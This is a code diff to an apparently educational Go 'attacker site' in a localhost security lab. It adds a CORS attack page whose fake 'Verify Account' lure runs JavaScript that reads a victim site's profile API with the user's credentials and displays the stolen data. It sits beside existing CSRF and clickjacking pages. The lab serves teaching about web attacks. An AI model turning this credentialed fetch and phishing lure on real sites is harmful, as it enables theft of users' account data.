@@ -11,6 +11,7 @@ func main() {
 	mux.HandleFunc("/", homeHandler)
 	mux.HandleFunc("/csrf", csrfHandler)
 	mux.HandleFunc("/clickjacking", clickjackingHandler)
+	mux.HandleFunc("/cors", corsHandler)
 
 	log.Println("Attacker site starting on :8081")
 	log.Fatal(http.ListenAndServe(":8081", mux))
@@ -23,6 +24,7 @@ func homeHandler(w http.ResponseWriter, r *http.Request) {
 		<ul>
 			<li><a href="/csrf">CSRF Attack Page</a></li>
 			<li><a href="/clickjacking">Clickjacking Attack Page</a></li>
+				<li><a href="/cors">CORS Attack Page</a></li>
 		</ul>
 		<hr>
 		<p><a href="http://localhost:8080">Back to Victim Site</a></p>
@@ -83,5 +85,34 @@ func clickjackingHandler(w http.ResponseWriter, r *http.Request) {
 			<button class="fake-btn">GET DONUTS</button>
 		</div>
 		<iframe id="victim-frame" src="http://localhost:8080/follow"></iframe>
+	`)
+}
+
+func corsHandler(w http.ResponseWriter, r *http.Request) {
+	w.Header().Set("Content-Type", "text/html; charset=utf-8")
+	fmt.Fprintf(w, `
+		<h1 style="color:red">Check your account security!</h1>
+		<p>Click the button below to verify your account is safe.</p>
+		<button onclick="stealData()" style="padding:10px 20px; font-size:18px">Verify Account</button>
+		<pre id="result" style="background:#f0f0f0; padding:15px; margin-top:20px; display:none"></pre>
+		<script>
+		function stealData() {
+			fetch('http://localhost:8080/api/profile', {credentials: 'include'})
+				.then(r => r.json())
+				.then(data => {
+					document.getElementById('result').style.display = 'block';
+					document.getElementById('result').textContent =
+						'Stolen data from victim site:\n' + JSON.stringify(data, null, 2) +
+						'\n\n(In a real attack, this data would be silently sent to the attacker server)';
+				})
+				.catch(err => {
+					document.getElementById('result').style.display = 'block';
+					document.getElementById('result').textContent = 'Error: ' + err.message +
+						'\n\n(Make sure you are logged in on the victim site)';
+				});
+		}
+		</script>
+		<hr>
+		<p><a href="/">Back to Attacker Site</a> | <a href="http://localhost:8080">Back to Victim Site</a></p>
 	`)
 }
